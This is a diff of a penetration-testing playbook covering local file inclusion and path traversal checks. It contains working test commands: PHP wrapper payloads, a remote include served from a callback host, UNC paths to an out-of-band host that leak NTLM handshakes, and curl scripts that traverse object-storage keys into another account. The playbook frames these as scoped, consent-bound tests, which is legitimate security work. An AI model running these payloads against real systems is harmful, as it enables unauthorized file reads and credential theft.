@@ -99,9 +99,10 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
 - **Where:** parameters whose value names a file: `file=`, `filename=`, `path=`, `doc=`, `download=`,
   `attachment=`, `page=`, `template=`, `tpl=`, `view=`, `layout=`, `include=`, `lang=`, `locale=`, `theme=`,
   `skin=`, `report=`, in the query, a form or JSON body, a cookie (`lang`, `theme`) or a path segment
-  (`/download/<name>`, `/files/<name>`). Find them in the crawl (`grep -rhiEo '[?&"](file|filename|path|page|template|lang|locale)[a-z_]*=' "$E/recon/$H/"`)
-  and look for values with an extension (`invoice-2291.pdf`, `faq.html`, `en.json`) or a bare name the server maps
-  to a file (`page=faq`, `lang=en`). A Rails controller that renders a file named by the `Accept` header is CVE-017
+  (`/download/<name>`, `/files/<name>`). Find them in the crawl with
+  `grep -rhiEo '[?&"](file|filename|path|page|template|lang|locale)[a-z_]*=' "$E/recon/$H/"`, and look for values
+  with an extension (`invoice-2291.pdf`, `faq.html`, `en.json`) or a bare name the server maps to a file
+  (`page=faq`, `lang=en`). A Rails controller that renders a file named by the `Accept` header is CVE-017
   (CVE-2019-5418), not this card.
 - **Test:** first prove the value is used as a path. `./<value>` returns the same bytes as `<value>` on any path,
   and a lookup key or allow-list fails it. `lfi001-nx/<value>` must fail: if it returns the file, the application
@@ -269,8 +270,8 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   URL fetcher, SSR-001.
 - **Escalate:** read nothing further than the proof without the policy's consent; name the configuration files
   that sit under `/proc/self/cwd/`. `file:` accepted means the value is opened as a URL: SSR-001 and SSR-009 for
-  the other schemes. On a Windows back end a UNC path (`\\<callback host>\lfi003\x`) makes the server connect over
-  SMB and leak an NTLM handshake: SSR-009 (needs `oob`).
+  the other schemes. On a Windows back end a UNC path (`\\$OOB\lfi003\x`) makes the server connect over SMB and
+  leak an NTLM handshake: SSR-009 (needs `oob`).
 
 ### LFI-004 · A PHP include or file-read parameter accepts `php://filter` and returns the base64 source of a PHP file
 
@@ -327,9 +328,9 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   `lfi004-zip`) and not `lfi004 */`, beside the `b64` row. Quote a few lines of source in the report, not the
   application; configuration files (`config.php`, `wp-config.php`, `.env`) are named, not read. The empty block is
   the whole execution proof: no function call goes into it.
-- **Not a finding when:** the error shows the wrapper behind a directory (`failed to open stream: ... pages/php://filter/...`):
-  a prefix before the value turns the wrapper into a relative path, so wrappers are out and only a plain climb is
-  left (LFI-001). The base64 decodes to the same bytes as `b64-control`: an error template, not the file. The
+- **Not a finding when:** the error shows the wrapper behind a directory
+  (`failed to open stream: ... pages/php://filter/...`): a prefix before the value turns the wrapper into a relative
+  path, so wrappers are out and only a plain climb is left (LFI-001). The base64 decodes to the same bytes as `b64-control`: an error template, not the file. The
   `data:` rows show both the marker and `lfi004 */`: the stream was read and printed (`readfile`,
   `file_get_contents`), which is a read primitive, not code execution. The response warns
   `wrapper is disabled in the server configuration by allow_url_include=0`: that confirms an include sink and
@@ -440,8 +441,8 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   grep -a -l 'lfi006-included' "$D"/*.body; grep -a -l 'lfi006 \*/' "$D"/*.body
   ```
   The `ftp://` row needs an FTP listener on the callback host. Windows back end: run an SMB share on the callback
-  host (`impacket-smbserver lfi006 .`) and send `\\<callback host>\lfi006\lfi006.txt`; SSR-009 covers the NTLM
-  handshake it also leaks.
+  host (`impacket-smbserver lfi006 .`) and send `\\$OOB\lfi006\lfi006.txt`; SSR-009 covers the NTLM handshake it
+  also leaks.
 - **Proof:** the request from the target's address arriving at the callback host for `lfi006.txt`, and the include
   response containing `lfi006-included` without `lfi006 */`: PHP parsed a block that came from our host. Nothing
   else is placed in the file.
@@ -584,7 +585,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   Imports that also copy files the archive's manifest names: LFI-009. A known extraction CVE in the identified
   product: the CVE chapter.
 
-### LFI-009 · A file reference stored in our content or an import manifest is dereferenced by a later copy, move, import or export job, which reads a file outside the upload store
+### LFI-009 · A stored file reference is dereferenced by a later copy, move or import job, which copies a file from outside the upload store
 
 | | |
 |---|---|
@@ -648,7 +649,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   direction (a destination name with `../`) on our own projects only, with a new file name. Archive imports:
   LFI-008. Secrets the job could read feed DSR-005, DSR-009 and DSR-011 as described chains.
 
-### LFI-010 · A server-side converter or renderer follows a local file reference written in our file or markup and puts the file's bytes in its output
+### LFI-010 · A server-side converter or renderer follows a local file reference in our upload or markup and outputs the file's bytes
 
 | | |
 |---|---|
@@ -725,15 +726,15 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   `secure` mode, the default for its API, turns `include::` into a link; Kroki's default safe mode and PlantUML's
   `SANDBOX` and `INTERNET` security profiles refuse local includes; docutils with `file_insertion_enabled` off
   answers `.. include::` with a "directive disabled" warning). AsciiDoc in `safe` or `server` mode reads includes
-  only inside its base directory, and the jail error is not a finding. FFmpeg refuses the playlist (`is not in allowed_extensions` in a job error, or no
-  frames): a current build. The ImageMagick chunk is ignored outside the CVE-2022-44268 builds, and programmes that
+  only inside its base directory, and the jail error is not a finding. FFmpeg refuses the playlist
+  (`is not in allowed_extensions` in a job error, or no frames): a current build. The ImageMagick chunk is ignored outside the CVE-2022-44268 builds, and programmes that
   exclude known CVEs inside their patch window close that variant (`known-cve`). The file is rendered by your own
   browser (client-side Mermaid, a JavaScript Markdown preview): the browser has no access to the server's disk.
 - **Escalate:** the same converters fetch URLs: SSR-008 for `http://` references, SSR-007 for HTML renderers. A
   version-specific converter bug: the CVE chapter. Read a second file only if the policy asks for more than
   `/etc/hostname`.
 
-### LFI-011 · A storage key built from our file name or key parameter is normalised before the object-store call, so `../` reads or writes outside our own prefix
+### LFI-011 · An object-storage key built from our file name is normalised before use, so `../` reaches outside our own prefix
 
 | | |
 |---|---|
@@ -765,10 +766,15 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
       -d "{\"filename\":\"$f\",\"contentType\":\"text/plain\"}" -o "$D/presign$n.json" -w "%{http_code} [$f]\n"; sleep "$W"; done
   grep -ho '"key":"[^"]*"\|https://[^"?]*' "$D"/presign*.json   # literal ../ in the key is harmless; a key outside the prefix is the bug
   # 2. only for a key that left the prefix: upload the marker with the URL the application signed, then read it back
+  N=2                                   # the presign file whose key resolved outside the prefix
+  SURL=$(grep -o 'https://[^"]*' "$D/presign$N.json" | head -1 | sed 's/\\u0026/\&/g')
   printf '%s\n' "$R" > "$D/$R.txt"
-  curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: text/plain' --data-binary @"$D/$R.txt" --path-as-is "<signed URL from that presign file>" -w '%{http_code}\n'
-  # 3. read direction, with account B: a download that prefixes our id, aimed at an object B uploaded
-  curl -sS "${HDR[@]}" $A --get --data-urlencode "name=../<B id>/<B file name>" "$T/api/files/download" -o "$D/b.bin" -w '%{http_code} %{size_download}\n'
+  curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: text/plain' --data-binary @"$D/$R.txt" --path-as-is "$SURL" -w '%{http_code}\n'
+  # 3. read direction, with account B: B uploads a file, then A asks for it through a download that prefixes A's id
+  printf 'lfi011-b\n' > "$D/b.txt"
+  curl -sS "${HDR[@]}" $B -F "file=@$D/b.txt;filename=$R-b.txt;type=text/plain" "$T/api/files" -o "$D/b-upload.json"
+  BID=$(curl -sS "${HDR[@]}" $B "$T/api/me" | grep -oE '"id":"?[A-Za-z0-9-]+' | head -1 | sed -E 's/.*:"?//')   # B's id as keys use it
+  curl -sS "${HDR[@]}" $A --get --data-urlencode "name=../$BID/$R-b.txt" "$T/api/files/download" -o "$D/b.bin" -w '%{http_code} %{size_download}\n'
   ```
   The PUT goes to the storage host: it must be in the programme's scope or named in the engagement's
   `allow-infra.txt`, and the scope guard refuses it otherwise.
@@ -835,7 +841,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   DSR-009 or DSR-011 chain. Another alias one level up can be climbed again from its own prefix. Other front-end
   disagreements on the same host: LFI-013 and BAC-018.
 
-### LFI-013 · A Java back end behind a front end resolves `..;/`, so a forwarded prefix reaches contexts and routes the front end never forwards
+### LFI-013 · A Java back end resolves `..;/` that its front end forwards, reaching contexts and routes the front end never exposes
 
 | | |
 |---|---|
